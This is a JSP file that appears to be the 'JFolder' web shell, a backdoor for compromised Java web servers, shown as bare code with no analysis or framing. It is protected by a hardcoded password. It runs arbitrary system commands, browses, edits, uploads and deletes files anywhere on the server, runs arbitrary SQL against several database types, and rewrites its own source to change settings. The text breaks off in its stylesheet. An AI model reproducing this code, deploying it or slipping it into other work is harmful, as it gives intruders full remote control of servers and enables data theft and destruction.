<%@ page contentType="text/html; charset=GBK" %>
<%@ page import="java.io.*"%>
<%@ page import="java.util.Map"%>
<%@ page import="java.util.HashMap"%>
<%@ page import="java.nio.charset.Charset"%>
<%@ page import="java.util.regex.*"%>
<%@ page import="java.sql.*"%>
<%!
private String _password = "tsecnetwork1337";
private String _encodeType = "GB2312";
private int _sessionOutTime = 20;
private String[] _textFileTypes = {"txt", "htm", "html", "asp", "jsp", "java", "js", "css", "c", "cpp", "sh", "pl", "cgi", "php", "conf", "xml", "xsl", "ini", "vbs", "inc"};
private Connection _dbConnection = null;
private Statement _dbStatement = null;
private String _url = null;

public boolean validate(String password) {
    if (password.equals(_password)) {
        return true;
    } else {
        return false;
    }
}

public String HTMLEncode(String str) {
    str = str.replaceAll(" ", "&nbsp;");
    str = str.replaceAll("<", "&lt;");
    str = str.replaceAll(">", "&gt;");
    str = str.replaceAll("\r\n", "<br>");
    
    return str;
}

public String Unicode2GB(String str) {
    String sRet = null;
    
    try {
        sRet = new String(str.getBytes("ISO8859_1"), _encodeType);
    } catch (Exception e) {
        sRet = str;
    }
    
    return sRet;
}

public String exeCmd(String cmd) {
    Runtime runtime = Runtime.getRuntime();
    Process proc = null;
    String retStr = "";
    InputStreamReader insReader = null;
    char[] tmpBuffer = new char[1024];
    int nRet = 0;
    
    try {
        proc = runtime.exec(cmd);
        insReader = new InputStreamReader(proc.getInputStream(), Charset.forName("GB2312"));
        
        while ((nRet = insReader.read(tmpBuffer, 0, 1024)) != -1) {
            retStr += new String(tmpBuffer, 0, nRet);
        }
        
        insReader.close();
        retStr = HTMLEncode(retStr);
    } catch (Exception e) {
        retStr = "<font color=\"red\">bad command \"" + cmd + "\"</font>";
    } finally {
        return retStr;
    }
}

public String pathConvert(String path) {
    String sRet = path.replace('\\', '/');
    File file = new File(path);
    
    if (file.getParent() != null) {
        if (file.isDirectory()) {
            if (! sRet.endsWith("/"))
                sRet += "/";
        }
    } else {
        if (! sRet.endsWith("/"))
            sRet += "/";    
    }
    
    return sRet;
}

public String strCut(String str, int len) {
    String sRet;
    
    len -= 3;
    
    if (str.getBytes().length <= len) {
        sRet = str;
    } else {
        try {
            sRet = (new String(str.getBytes(), 0, len, "GBK")) + "...";
        } catch (Exception e) {
            sRet = str;
        }
    }
    
    return sRet;
}

public String listFiles(String path, String curUri) {
    File[] files = null;
    File curFile = null;
    String sRet = null;
    int n = 0;
    boolean isRoot = path.equals("");
    
    path = pathConvert(path);
    
    try {
        if (isRoot) {
            files = File.listRoots();
        } else {
            try {
                curFile = new File(path);
                String[] sFiles = curFile.list();
                files = new File[sFiles.length];
                    
                for (n = 0; n < sFiles.length; n ++) {
                    files[n] = new File(path + sFiles[n]);
                }
            } catch (Exception e) {
                sRet = "<font color=\"red\">bad path \"" + path + "\"</font>";
            }
        }
        
        if (sRet == null) {
            sRet = "\n";
            sRet += "<script language=\"javascript\">\n";
            sRet += "var selectedFile = null;\n";
            sRet += "<!--\n";
            sRet += "function createFolder() {\n";
            sRet += "    var folderName = prompt(\"Please enter folder name\", \"\");\n";
            sRet += "    if (folderName != null && folderName != false && ltrim(folderName) != \"\") {\n";
            sRet += "        window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=createFolder&folderName=\" + folderName + \"" + "\";\n";
            sRet += "    }\n";
            sRet += "}\n";
            sRet += "\n";
            sRet += "function createFile() {\n";
            sRet += "    var fileName = prompt(\"Please enter file name\", \"\");\n";
            sRet += "    if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
            sRet += "        window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=createFile&fileName=\" + fileName + \"" + "\";\n";
            sRet += "    }\n";
            sRet += "}\n";
            sRet += "\n";
            sRet += "function selectFile(obj) {\n";
            sRet += "    if (selectedFile != null)\n";
            sRet += "        selectedFile.style.backgroundColor = \"#FFFFFF\";\n";
            sRet += "    selectedFile = obj;\n";
            sRet += "    obj.style.backgroundColor = \"#CCCCCC\";\n";
            sRet += "}\n";
            sRet += "\n";
            sRet += "function change(obj) {\n";
            sRet += "    if (selectedFile != obj)\n";
            sRet += "        obj.style.backgroundColor = \"#CCCCCC\";\n";
            sRet += "}\n";
            sRet += "\n";
            sRet += "function restore(obj) {\n";
            sRet += "    if (selectedFile != obj)\n";
            sRet += "        obj.style.backgroundColor = \"#FFFFFF\";\n";
            sRet += "}\n";
            sRet += "\n";
            sRet += "function showUpload() {\n";
            sRet += "    up.style.visibility = \"visible\";\n";
            sRet += "}\n";
            sRet += "\n";
            sRet += "function copyFile() {\n";
            sRet += "    var toPath = prompt(\"Please enter destination directory (absolute path)\", \"\");\n";
            sRet += "    if (toPath != null && toPath != false && ltrim(toPath) != \"\") {\n";
            sRet += "        document.fileList.action = \"" + curUri + "&curPath=" + path + "&fsAction=copyto&dstPath=" + "\" + toPath;\n";
            sRet += "        document.fileList.submit();\n";
            sRet += "    }\n";
            sRet += "}\n";
            sRet += "\n";
            sRet += "function rename() {\n";
            sRet += "    var count = 0;\n";
            sRet += "    var selected = -1;\n";
            sRet += "    for (var i = 0; i < document.fileList.filesDelete.length; i ++) {\n";
            sRet += "        if (document.fileList.filesDelete[i].checked) {\n";
            sRet += "            count ++;\n";
            sRet += "            selected = i;\n";
            sRet += "        }\n";
            sRet += "    }\n";
            sRet += "    if (count > 1)\n";
            sRet += "        alert(\"Cannot rename multiple files\");\n";
            sRet += "    else if (selected == -1)\n";
            sRet += "        alert(\"No file selected to rename\");\n";
            sRet += "    else {\n";
            sRet += "        var newName = prompt(\"Please enter new file name\", \"\");\n";
            sRet += "        if (newName != null && newName != false && ltrim(newName) != \"\") {\n";
            sRet += "            window.location.href = \"" + curUri + "&curPath=" + path + "&fsAction=rename&newName=\" + newName + \"&fileRename=\" + document.fileList.filesDelete[selected].value;";
            sRet += "        }\n";
            sRet += "    }\n";
            sRet += "}\n";
            sRet += "\n";
            sRet += "//-->\n";
            sRet += "</script>\n";
            sRet += "<table width=\"100%\" border=\"0\" cellpadding=\"2\" cellpadding=\"1\">\n";
            sRet += "    <form enctype=\"multipart/form-data\" method=\"post\" name=\"upload\" action=\"" + curUri + "&curPath=" + path + "&fsAction=upload" + "\">\n";
            
            if (curFile != null) {
                sRet += "    <tr>\n";
                sRet += "        <td colspan=\"4\" valign=\"middle\">\n";
                sRet += "            &nbsp;<a href=\"" + curUri + "&curPath=" + (curFile.getParent() == null ? "" : pathConvert(curFile.getParent())) + "\">Parent Directory</a>&nbsp;";
                sRet += "<a href=\"#\" onclick=\"javascript:createFolder()\">Create Folder</a>&nbsp;";
                sRet += "<a href=\"#\" onclick=\"javascript:createFile()\">New File</a>&nbsp;";
                sRet += "<a href=\"#\" onclick=\"javascript:document.fileList.submit();\">Delete</a>&nbsp;";
                sRet += "<a href=\"#\" onclick=\"javascript:copyFile()\">Copy</a>&nbsp;";
                sRet += "<a href=\"#\" onclick=\"javascript:rename()\">Rename</a>&nbsp;";
                sRet += "<a href=\"#\" onclick=\"javascript:showUpload()\">Upload File</a>\n";
                sRet += "<span style=\"visibility: hidden\" id=\"up\"><input type=\"file\" value=\"Upload\" name=\"upFile\" size=\"8\" class=\"textbox\" />&nbsp;<input type=\"submit\" value=\"Upload\" class=\"button\"></span>\n";
                sRet += "        </td>\n";
                sRet += "    </tr>\n";
            }
            
            sRet += "</form>\n";
            
            sRet += "    <form name=\"fileList\" method=\"post\" action=\"" + curUri + "&curPath=" + path + "&fsAction=deleteFile" + "\">\n";
            
            for (n = 0; n < files.length; n ++) {
                sRet += "    <tr onclick=\"javascript: selectFile(this)\" onmouseover=\"javascript: change(this)\" onmouseout=\"javascript: restore(this)\" style=\"cursor:hand;\">\n";
                
                if (! isRoot) {
                    sRet += "        <td width=\"5%\" align=\"center\"><input type=\"checkbox\" name=\"filesDelete\" value=\"" + pathConvert(files[n].getPath()) + "\" /></td>\n";
                    if (files[n].isDirectory()) {
                        sRet += "        <td><a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "\" title=\"" + files[n].getName() + "\">&lt;" + strCut(files[n].getName(), 50) + "&gt;</a></td>\n";
                    } else {
                        sRet += "        <td><a title=\"" + files[n].getName() + "\">" + strCut(files[n].getName(), 50) + "</a></td>\n";
                    }
                    
                    sRet += "        <td width=\"15%\" align=\"center\">" + (files[n].isDirectory() ? "&lt;dir&gt;" : "") + ((! files[n].isDirectory()) && isTextFile(getExtName(files[n].getPath())) ? "<<a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "&fsAction=open" + "\">edit</a>>" : "") + "</td>\n";
                    sRet += "        <td width=\"15%\" align=\"center\">" + files[n].length() + "</td>\n";
                } else {
                    sRet += "        <td><a href=\"" + curUri + "&curPath=" + pathConvert(files[n].getPath()) + "\" title=\"" + files[n].getName() + "\">" + pathConvert(files[n].getPath()) + "</a></td>\n";
                }
    
                sRet += "    </tr>\n";
            }
            sRet += "    </form>\n";
            sRet += "</table>\n";
        }
    } catch (SecurityException e) {
        sRet = "<font color=\"red\">security violation, no privilege.</font>";
    }
    
    return sRet;
}

public boolean isTextFile(String extName) {
    int i;
    boolean bRet = false;
    
    if (! extName.equals("")) {
        for (i = 0; i < _textFileTypes.length; i ++) {
            if (extName.equals(_textFileTypes[i])) {
                bRet = true;
                break;
            }
        }
    } else {
        bRet = true;
    }
    
    return bRet;
}

public String getExtName(String fileName) {
    String sRet = "";
    int    nLastDotPos;
    
    fileName = pathConvert(fileName);
    
    nLastDotPos = fileName.lastIndexOf(".");
    
    if (nLastDotPos == -1) {
        sRet = "";
    } else {
        sRet = fileName.substring(nLastDotPos + 1);
    }
    
    return sRet;
}

public String browseFile(String path) {
    String sRet = "";
    File file = null;
    FileReader fileReader = null;
    
    path = pathConvert(path);
    
    try {
        file = new File(path);
        fileReader = new FileReader(file);
        String fileString = "";
        char[] chBuffer = new char[1024];
        int ret;
        
        sRet = "<script language=\"javascript\">\n";
        
        while ((ret = fileReader.read(chBuffer, 0, 1024)) != -1) {
            fileString += new String(chBuffer, 0, ret);
        }
        
        sRet += "var wnd = window.open(\"about:blank\", \"_blank\", \"width=600, height=500\");\n";
        sRet += "var doc = wnd.document;\n";
        sRet += "doc.write(\"" + "aaa" + "\");\n";
        
        sRet += "</script>\n";
        
    } catch (IOException e) {
        sRet += "<script language=\"javascript\">\n";
        sRet += "alert(\"Failed to open file " + path + "\");\n";
        sRet += "</script>\n";
    }
    
    return sRet;
}

public String openFile(String path, String curUri) {
    String sRet = "";
    boolean canOpen = false;
    int nLastDotPos = path.lastIndexOf(".");
    String extName = "";
    String fileString = null;
    File curFile = null;
    
    path = pathConvert(path);
    
    if (nLastDotPos == -1) {
        canOpen = true;
    } else {
        extName = path.substring(nLastDotPos + 1);
        canOpen = isTextFile(extName);
    }
    
    if (canOpen) {
        try {
            fileString = "";
            curFile = new File(path);
            FileReader fileReader = new FileReader(curFile);
            char[] chBuffer = new char[1024];
            int nRet;
            
            while ((nRet = fileReader.read(chBuffer, 0, 1024)) != -1) {
                fileString += new String(chBuffer, 0, nRet);
            }
            
            fileReader.close();
        } catch (IOException e) {
            fileString = null;
            sRet = "<font color=\"red\">Cannot open file \"" + path + "\"</font>";
        } catch (SecurityException e) {
            fileString = null;
            sRet = "<font color=\"red\">Security issue, no permission to perform this operation</font>";
        }
    } else {
        sRet = "<font color=\"red\">file \"" + path + "\" is not a text file, can't be opened in text mode</font>";
    }
    
    if (fileString != null) {
        sRet += "<script language=\"javascript\">";
        sRet += "<!--\n";
        sRet += "function saveAs() {\n";
        sRet += "    var fileName = prompt(\"Please enter file name\", \"\");\n";
        sRet += "    if (fileName != null && fileName != false && ltrim(fileName) != \"\") {\n";
        sRet += "        document.openfile.action=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\" + fileName + \"&fsAction=saveAs\";\n";
        sRet += "        document.openfile.submit();\n";
        sRet += "    }\n";
        sRet += "}\n";
        sRet += "//-->\n";
        sRet += "</script>\n";
        sRet += "<table align=\"center\" width=\"100%\" cellpadding=\"2\" cellspacing=\"1\">\n";
        sRet += "    <form name=\"openfile\" method=\"post\" action=\"" + curUri + "&curPath=" + path + "&fsAction=save" + "\">\n";
        sRet += "    <tr>\n";
        sRet += "        <td>[<a href=\"" + curUri + "&curPath=" + pathConvert(curFile.getParent()) + "\">Parent Directory</a>]</td>\n";
        sRet += "    </tr>\n";
        sRet += "    <tr>\n";
        sRet += "        <td align=\"center\">\n";
        sRet += "            <textarea name=\"fileContent\" cols=\"80\" rows=\"32\">\n";
        sRet += fileString;
        sRet += "            </textarea>\n";
        sRet += "        </td>\n";
        sRet += "    </tr>\n";
        sRet += "    <tr>\n";
        sRet += "        <td align=\"center\"><input type=\"submit\" class=\"button\" value=\"Save\" />&nbsp;<input type=\"button\" class=\"button\" value=\"Save As\" onclick=\"javascript:saveAs()\" /></td>\n";
        sRet += "    </tr>\n";
        sRet += "    </form>\n";
        sRet += "</table>\n";
    }
    
    return sRet;
}

public String saveFile(String path, String curUri, String fileContent) {
    String sRet = "";
    File file = null;
    
    path = pathConvert(path);
    
    try {
        file = new File(path);
        
        if (! file.canWrite()) {
            sRet = "<font color=\"red\">File is not writable</font>";
        } else {
            FileWriter fileWriter = new FileWriter(file);
            fileWriter.write(fileContent);
            
            fileWriter.close();
            sRet = "File saved successfully, returning now, please wait...\n";
            sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "&fsAction=open" + "\" />\n";    
        }
    } catch (IOException e) {
        sRet = "<font color=\"red\">Failed to save file</font>";
    } catch (SecurityException e) {
        sRet = "<font color=\"red\">Security issue, no permission to perform this operation</font>";
    }
    
    return sRet;
}

public String createFolder(String path, String curUri, String folderName) {
    String sRet = "";
    File folder = null;
    
    path = pathConvert(path);
    
    try {
        folder = new File(path + folderName);
        
        if (folder.exists() && folder.isDirectory()) {
            sRet = "<font color=\"red\">\"" + path + folderName + "\" directory already exists</font>";
        } else {
            if (folder.mkdir()) {
                sRet = "Successfully created directory \"" + pathConvert(folder.getPath()) + "\", returning now, please wait...\n";
                    sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + folderName + "\" />";
            } else {
                sRet = "<font color=\"red\">Failed to create directory \"" + folderName + "\"</font>";
            }
        }
    } catch (SecurityException e) {
        sRet = "<font color=\"red\">Security issue, no permission to perform this operation</font>";
    }
    
    return sRet;
}

public String createFile(String path, String curUri, String fileName) {
    String sRet = "";
    File file = null;
    
    path = pathConvert(path);
    
    try {
        file = new File(path + fileName);
        
        if (file.createNewFile()) {
            sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + fileName + "&fsAction=open" + "\" />";
        } else {
            sRet = "<font color=\"red\">\"" + path + fileName + "\" file already exists</font>";
        }
    } catch (SecurityException e) {
        sRet = "<font color=\"red\">Security issue, no permission to perform this operation</font>";
    } catch (IOException e) {
        sRet = "<font color=\"red\">Failed to create file \"" + path + fileName + "\"</font>";
    }
    
    return sRet;
} 

public String deleteFile(String path, String curUri, String[] files2Delete) {
    String sRet = "";
    File tmpFile = null;
    
    try {
        for (int i = 0; i < files2Delete.length; i ++) {
            tmpFile = new File(files2Delete[i]);
            if (! tmpFile.delete()) {
                sRet += "<font color=\"red\">Failed to delete \"" + files2Delete[i] + "\"</font><br>\n";
            }
        }
        
        if (sRet.equals("")) {
            sRet = "Deleted successfully, returning now, please wait...\n";
            sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
        }
    } catch (SecurityException e) {
        sRet = "<font color=\"red\">Security issue, no permission to perform this operation</font>\n";
    }
    
    return sRet;
}

public String saveAs(String path, String curUri, String fileContent) {
    String sRet = "";
    File file = null;
    FileWriter fileWriter = null;
    
    try {
        file = new File(path);
        
        if (file.createNewFile()) {
            fileWriter = new FileWriter(file);
            fileWriter.write(fileContent);
            fileWriter.close();
            
            sRet = "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + "&fsAction=open" + "\" />";
        } else {
            sRet = "<font color=\"red\">File \"" + path + "\" already exists</font>";
        }
    } catch (IOException e) {
        sRet = "<font color=\"red\">Failed to create file \"" + path + "\"</font>";
    }    
    
    return sRet;
}


public String uploadFile(ServletRequest request, String path, String curUri) {
    String sRet = "";
    File file = null;
    InputStream in = null;
    
    path = pathConvert(path);
    
    try {
        in = request.getInputStream();
        
        byte[] inBytes = new byte[request.getContentLength()];
        int nBytes;
        int start = 0;
        int end = 0;
        int size = 1024;
        String token = null;
        String filePath = null;

        //
        // Read input stream into byte array
        //
        while ((nBytes = in.read(inBytes, start, size)) != -1) {
            start += nBytes;
        }
        
        in.close();
        //
        // Get file separator from byte array
        //
        int i = 0;
        byte[] seperator;
        
        while (inBytes[i] != 13) {
            i ++;
        }
        
        seperator =  new byte[i];
    
        for (i = 0; i < seperator.length; i ++) {
            seperator[i] = inBytes[i];
        }
        
        //
        // Get Header part
        //
        String dataHeader = null;
        i += 3;
        start = i;
        while (! (inBytes[i] == 13 && inBytes[i + 2] == 13)) {
            i ++;
        }
        end = i - 1;
        dataHeader = new String(inBytes, start, end - start + 1);
        
        //
        // Get file name
        //
        token = "filename=\"";
        start = dataHeader.indexOf(token) + token.length();
        token = "\"";
        end = dataHeader.indexOf(token, start) - 1;
        filePath = dataHeader.substring(start, end + 1);
        filePath =     pathConvert(filePath);
        String fileName = filePath.substring(filePath.lastIndexOf("/") + 1);
        
        //
        // Get file content start position
        //    
        i += 4;
        start = i;
        
        /*
        boolean found = true;        
        byte[] tmp = new byte[seperator.length];
        while (i <= inBytes.length - 1 - seperator.length) {
        
            for (int j = i; j < i + seperator.length; j ++) { 
                if (seperator[j - i] != inBytes[j]) {
                    found = false;
                    break;
                } else
                    tmp[j - i] = inBytes[j];
            }
            
            if (found)
                break;
            
            i ++;
        }*/
        
        //
        // Lazy method
        //
        end = inBytes.length - 1 - 2 - seperator.length - 2 - 2;
        
        //
        // Save as file
        //
        File newFile = new File(path + fileName);
        newFile.createNewFile();
        FileOutputStream out = new FileOutputStream(newFile);
        
        //out.write(inBytes, start, end - start + 1);
        out.write(inBytes, start, end - start + 1);
        out.close();
        
        sRet = "<script language=\"javascript\">\n";
        sRet += "alert(\"File uploaded successfully " + fileName + "\");\n";
        sRet += "</script>\n";
    } catch (IOException e) {
        sRet = "<script language=\"javascript\">\n";
        sRet += "alert(\"File upload failed\");\n";
        sRet += "</script>\n";
    }
    
    sRet += "<meta http-equiv=\"refresh\" content=\"0;url=" + curUri + "&curPath=" + path + "\" />";
    return sRet;
}

public boolean fileCopy(String srcPath, String dstPath) {
    boolean bRet = true;
    
    try {
        FileInputStream in = new FileInputStream(new File(srcPath));
        FileOutputStream out = new FileOutputStream(new File(dstPath));
        byte[] buffer = new byte[1024];
        int nBytes;
        

        while ((nBytes = in.read(buffer, 0, 1024)) != -1) {
            out.write(buffer, 0, nBytes);
        }
        
        in.close();
        out.close();
    } catch (IOException e) {
        bRet = false;
    }    
    
    return bRet;
}

public String getFileNameByPath(String path) {
    String sRet = "";
    
    path = pathConvert(path);
    
    if (path.lastIndexOf("/") != -1) {
        sRet = path.substring(path.lastIndexOf("/") + 1);
    } else {
        sRet = path;
    }
    
    return sRet;
}

public String copyFiles(String path, String curUri, String[] files2Copy, String dstPath) {
    String sRet = "";
    int i;
    
    path = pathConvert(path);
    dstPath = pathConvert(dstPath);
    
    for (i = 0; i < files2Copy.length; i ++) {
        if (! fileCopy(files2Copy[i], dstPath + getFileNameByPath(files2Copy[i]))) {
            sRet += "<font color=\"red\">File \"" + files2Copy[i] + "\" copy failed</font><br/>";
        }
    }
    
    if (sRet.equals("")) {
        sRet = "Files copied successfully, returning now, please wait...";
        sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
    }
    
    return sRet;
}

public boolean isFileName(String fileName) {
    boolean bRet = false;
    
    Pattern p = Pattern.compile("^[a-zA-Z0-9][\\w\\.]*[\\w]$");
    Matcher m = p.matcher(fileName);
    
    bRet = m.matches();
    
    return bRet;
}

public String renameFile(String path, String curUri, String file2Rename, String newName) {
    String sRet = "";
    
    path = pathConvert(path);
    file2Rename = pathConvert(file2Rename);
    
    try {
        File file = new File(file2Rename);
        
        newName = file2Rename.substring(0, file2Rename.lastIndexOf("/") + 1) + newName;
        File newFile = new File(newName);
        
        if (! file.exists()) {
            sRet = "<font color=\"red\">File \"" + file2Rename + "\" does not exist</font>";
        } else {
            file.renameTo(newFile);
            sRet = "File renamed successfully, returning now, please wait...";
            sRet += "<meta http-equiv=\"refresh\" content=\"2;url=" + curUri + "&curPath=" + path + "\" />";
        }
    } catch (SecurityException e) {
        sRet = "<font color=\"red\">Security issue caused file \"" + file2Rename + "\" copy to fail</font>";
    }
    
    return sRet;
}

public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {
    boolean bRet = true;
    String driverName = "";
    
    if (dbServer.equals(""))
        dbServer = "localhost";
    
    try {
        if (dbType.equals("sqlserver")) {
            driverName = "com.microsoft.jdbc.sqlserver.SQLServerDriver";
            if (dbPort.equals(""))
                dbPort = "1433";
            _url = "jdbc:microsoft:sqlserver://" + dbServer + ":" + dbPort + ";User=" + dbUsername + ";Password=" + dbPassword + ";DatabaseName=" + dbName;
        } else if (dbType.equals("mysql")) {
            driverName = "com.mysql.jdbc.Driver";
            if (dbPort.equals(""))
                dbPort = "3306";
            _url = "jdbc:mysql://" + dbServer + ":" + dbPort + ";User=" + dbUsername + ";Password=" + dbPassword + ";DatabaseName=" + dbName;
        } else if (dbType.equals("odbc")) {
            driverName = "sun.jdbc.odbc.JdbcOdbcDriver";
            _url = "jdbc:odbc:dsn=" + dbName + ";User=" + dbUsername + ";Password=" + dbPassword;
        } else if (dbType.equals("oracle")) {
            driverName = "oracle.jdbc.driver.OracleDriver";
            _url = "jdbc:oracle:thin@" + dbServer + ":" + dbPort + ":" + dbName;
        } else if (dbType.equals("db2")) {
            driverName = "com.ibm.db2.jdbc.app.DB2Driver";
            _url = "jdbc:db2://" + dbServer + ":" + dbPort + "/" + dbName;
        }
        
        Class.forName(driverName);
    } catch (ClassNotFoundException e) {
        bRet = false;
    }
    
    return bRet;
}

public boolean DBConnect(String User, String Password) {
    boolean bRet = false;
    
    if (_url != null) {
        try {
            _dbConnection = DriverManager.getConnection(_url, User, Password);
            _dbStatement = _dbConnection.createStatement();
            bRet = true; 
        } catch (SQLException e) {
            bRet = false;
        }    
    } 
    
    return bRet;
}

public String DBExecute(String sql) {
    String sRet = "";
    
    if (_dbConnection == null || _dbStatement == null) {
        sRet = "<font color=\"red\">Database not properly connected</font>";
    } else {
        try {
            if (sql.toLowerCase().substring(0, 6).equals("select")) {
                ResultSet rs = _dbStatement.executeQuery(sql);
                ResultSetMetaData rsmd = rs.getMetaData();
                int colNum = rsmd.getColumnCount();
                int colType;
                
                sRet = "SQL executed successfully, results returned<br>\n";
                sRet += "<table align=\"center\" border=\"0\" bgcolor=\"#CCCCCC\" cellpadding=\"2\" cellspacing=\"1\">\n";
                sRet +=    "    <tr bgcolor=\"#FFFFFF\">\n";
                for (int i = 1; i <= colNum; i ++) {
                    sRet += "        <th>" + rsmd.getColumnName(i) + "(" + rsmd.getColumnTypeName(i) + ")</th>\n";
                }
                sRet += "    </tr>\n";
                while (rs.next()) {
                    sRet += "    <tr bgcolor=\"#FFFFFF\">\n";
                    for (int i = 1; i <= colNum; i ++) {
                        colType = rsmd.getColumnType(i);
                        
                        sRet += "        <td>";
                        switch (colType) {
                            case Types.BIGINT:
                            sRet += rs.getLong(i);
                            break;
                            
                            case Types.BIT:
                            sRet += rs.getBoolean(i);
                            break;
                            
                            case Types.BOOLEAN:
                            sRet += rs.getBoolean(i);
                            break;
                            
                            case Types.CHAR:
                            sRet += rs.getString(i);
                            break;
                            
                            case Types.DATE:
                            sRet += rs.getDate(i).toString();
                            break;
                            
                            case Types.DECIMAL:
                            sRet += rs.getDouble(i);
                            break;
                            
                            case Types.NUMERIC:
                            sRet += rs.getDouble(i);
                            break;
                            
                            case Types.REAL:
                            sRet += rs.getDouble(i);
                            break;
                            
                            case Types.DOUBLE:
                            sRet += rs.getDouble(i);
                            break;
                            
                            case Types.FLOAT:
                            sRet += rs.getFloat(i);
                            break;
                            
                            case Types.INTEGER:
                            sRet += rs.getInt(i);
                            break;
                            
                            case Types.TINYINT:
                            sRet += rs.getShort(i);
                            break;
                            
                            case Types.VARCHAR:
                            sRet += rs.getString(i);
                            break;
                            
                            case Types.TIME:
                            sRet += rs.getTime(i).toString();
                            break;
                            
                            case Types.DATALINK:
                            sRet += rs.getTimestamp(i).toString();
                            break;
                        }
                        sRet += "        </td>\n";
                    }
                    sRet += "    </tr>\n"; 
                }                
                sRet += "</table>\n";
                
                rs.close();
            } else {
                if (_dbStatement.execute(sql)) {
                    sRet = "SQL executed successfully";
                } else {
                    sRet = "<font color=\"red\">SQL execution failed</font>";
                }
            }
        } catch (SQLException e) {
            sRet = "<font color=\"red\">SQL execution failed</font>";
        }
    }
    
    return sRet;
}

public void DBRelease() {
    try {
        if (_dbStatement != null) {
            _dbStatement.close();
            _dbStatement = null;
        }
        
        if (_dbConnection != null) {
            _dbConnection.close();
            _dbConnection = null;
        }
    } catch (SQLException e) {
    
    }
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////

class JshellConfig {
    private String _jshellContent = null;
    private String _path = null;

    public JshellConfig(String path) throws JshellConfigException {
        _path = path;
        read();
    }
    
    private void read() throws JshellConfigException {
        try {
            FileReader jshell = new FileReader(new File(_path));
            char[] buffer = new char[1024];
            int nChars;
            _jshellContent = "";
            
            while ((nChars = jshell.read(buffer, 0, 1024)) != -1) {
                _jshellContent += new String(buffer, 0, nChars);
            }
            
            jshell.close();
        } catch (IOException e) {
            throw new JshellConfigException("Failed to open file");
        }
    }
    
    public void save() throws JshellConfigException {
        FileWriter jshell = null;
    
        try {
            jshell = new FileWriter(new File(_path));
            char[] buffer = _jshellContent.toCharArray();
            int start = 0;
            int size = 1024;
            
            for (start = 0; start < buffer.length - 1 - size; start += size) {
                jshell.write(buffer, start, size);
            }
            
            jshell.write(buffer, start, buffer.length - 1 - start);
        } catch (IOException e) {
            new JshellConfigException("Failed to write file");
        } finally {
            try {
                jshell.close();
            } catch (IOException e) {
            
            }
        }
    }
    
    public void setPassword(String password) throws JshellConfigException {
        Pattern p = Pattern.compile("\\w+");
        Matcher m = p.matcher(password);
        
        if (! m.matches()) {
            throw new JshellConfigException("Password cannot contain characters other than letters, numbers and underscores");
        }
        
        p = Pattern.compile("private\\sString\\s_password\\s=\\s\"" + _password + "\"");
        m = p.matcher(_jshellContent);
        if (! m.find()) {
            throw new JshellConfigException("Program body has been illegally modified");
        }
        
        _jshellContent = m.replaceAll("private String _password = \"" + password + "\"");
        
        //return HTMLEncode(_jshellContent);
    }
    
    public void setEncodeType(String encodeType) throws JshellConfigException {
        Pattern p = Pattern.compile("[A-Za-z0-9]+");
        Matcher m = p.matcher(encodeType);
        
        if (! m.matches()) {
            throw new JshellConfigException("Encoding format can only be a combination of letters and numbers");
        }
        
        p = Pattern.compile("private\\sString\\s_encodeType\\s=\\s\"" + _encodeType + "\"");
        m = p.matcher(_jshellContent);
        
        if (! m.find()) {
            throw new JshellConfigException("Program body has been illegally modified");
        }
        
        _jshellContent = m.replaceAll("private String _encodeType = \"" + encodeType + "\"");
        //return HTMLEncode(_jshellContent);
    }
    
    public void setSessionTime(String sessionTime) throws JshellConfigException {
        Pattern p = Pattern.compile("\\d+");
        Matcher m = p.matcher(sessionTime);
        
        if (! m.matches()) {
            throw new JshellConfigException("Session timeout can only be numbers");
        }
        
        p = Pattern.compile("private\\sint\\s_sessionOutTime\\s=\\s" + _sessionOutTime);
        m = p.matcher(_jshellContent);
        
        if (! m.find()) {
            throw new JshellConfigException("Program body has been illegally modified");
        }
        
        _jshellContent = m.replaceAll("private int _sessionOutTime = " + sessionTime);
        //return HTMLEncode(_jshellContent);
    }
    
    public void setTextFileTypes(String[] textFileTypes) throws JshellConfigException {
        Pattern p = Pattern.compile("\\w+");
        Matcher m = null;
        int i;
        String fileTypes = "";
        String tmpFileTypes = "";
        
        for (i = 0; i < textFileTypes.length; i ++) {
            m = p.matcher(textFileTypes[i]);
            
            if (! m.matches()) {
                throw new JshellConfigException("Extension can only be a combination of letters, numbers and underscores");
            }
            
            if (i != textFileTypes.length - 1)
                fileTypes += "\"" + textFileTypes[i] + "\"" + ", ";
            else
                fileTypes += "\"" + textFileTypes[i] + "\"";
        }
        
        for (i = 0; i < _textFileTypes.length; i ++) {
            if (i != _textFileTypes.length - 1)
                tmpFileTypes += "\"" + _textFileTypes[i] + "\"" + ", ";
            else
                tmpFileTypes += "\"" + _textFileTypes[i] + "\"";
        }
        
        p = Pattern.compile(tmpFileTypes);
        m = p.matcher(_jshellContent);
        
        if (! m.find()) {
            throw new JshellConfigException("Program file has been illegally modified");
        }
        
        _jshellContent = m.replaceAll(fileTypes);
        
        //return HTMLEncode(_jshellContent);
    }
    
    public String getContent() {
        return HTMLEncode(_jshellContent);
    }
}

class JshellConfigException extends Exception {
    public JshellConfigException(String message) {
        super(message);
    }
}
%>
<html>
<head>
<title>JFolder Modified by Chinese Pig Three</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312"></head>
<style>
body {
    font-size: 14px;
    font-family: Songti;
    background-color: #CCCCCC;
}
td {
    font-size: 14px;
    font-family: Songti;
}

input.textbox {
    border: black solid 1;
    font-size: 12px;
    height: 18px;
}

input.button {
    font-size: 12px;
    font-family: Songti;
    border: black solid 1;
}

td.datarows {
    font-size: 14px;
    font-family: Songti;
    height: 25px;
}

textarea {
